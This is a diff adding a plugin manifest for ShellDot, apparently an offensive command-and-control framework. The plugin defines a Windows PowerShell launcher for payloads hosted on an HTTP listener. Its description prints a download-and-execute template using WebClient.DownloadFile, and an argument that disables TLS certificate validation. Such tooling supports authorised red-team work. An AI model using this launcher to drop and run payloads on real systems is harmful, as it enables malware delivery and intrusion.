@@ -1,0 +1,40 @@
+---
+name: Example PowerShell Launcher Plugin by ShellDot
+version: 0.5.0
+description: |
+  Example Powershell All Plugin for ShellDot. This plugin provides a single launcher that uses HTTP listeners' payload hosting feature
+  to download and execute a file in PowerShell. This launcher is compatible with all types of payloads except for SHELLCODE.
+
+  The launcher template itself is very simple located in main.template.ps1
+  %%isHTTPS%% (New-Object System.Net.WebClient).DownloadFile('%%url%%', '%%filename%%');%%execution%%
+
+  The launcher template uses four arguments:
+  - isHTTPS: A boolean value that determines whether the download should be done over HTTPS or HTTP. This depends on the HTTP listener configuration.
+  - url: The URL of the file to download. It is provided by the HTTP listener.
+  - filename: The name of the file to save the downloaded file as. Default by the GUI would be payload.exe, but it is overriden by args/arg.filename.js.
+  - execution: The command to execute the downloaded file. This depends on the payload type, and is defined in args/arg.execution.js.
+
+  Arguments are parsed in the order they are defined. Previously parsed arguments will become available to later arguments
+   via argumentsPluginInterface["args.name"]
+
+  A single plugin can define multiple launchers. This plugin defines a single launcher that is compatible with all types of payloads except for SHELLCODE.
+
+  NB! Comments inside launcher.path template are not cleaned on generation. They will be in final output.
+
+type: launcher
+launchers:
+  - name: "PS> Download and Execute"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE", "SERVICE", "DLL"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    path: main.template.ps1
+    args:
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
+      - name: url
+      - name: filename
+        jsFile: args/arg.filename.js
+      - name: execution
+        jsFile: args/arg.execution.js
